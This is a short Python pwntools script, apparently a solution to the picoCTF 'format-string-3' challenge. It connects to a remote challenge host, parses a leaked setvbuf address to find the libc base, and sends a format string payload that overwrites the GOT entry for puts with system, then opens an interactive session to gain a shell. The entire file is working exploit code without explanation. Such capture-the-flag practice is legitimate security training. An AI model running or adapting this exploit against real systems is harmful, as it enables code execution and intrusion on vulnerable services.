#!/usr/bin/env python3
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

exe = "./format-string-3"
elf = context.binary = ELF(exe)
libc = ELF("./libc.so.6")

#io = process()
io = remote("rhea.picoctf.net", 57947)

if args.GDB: gdb.attach(io, "b *main+127") # gdb attachment

start = 38

io.recvuntil(b'setvbuf in libc: ')
leak = int(io.recvline().strip(), 16)
print("setvbuf @ %#x" % leak)

libc.address = leak - 0x000000000007a3f0
print("libc @ %#x" % libc.address)

payload = fmtstr_payload(start, {elf.sym.got.puts: libc.sym.system})

io.sendline(payload)
io.interactive()
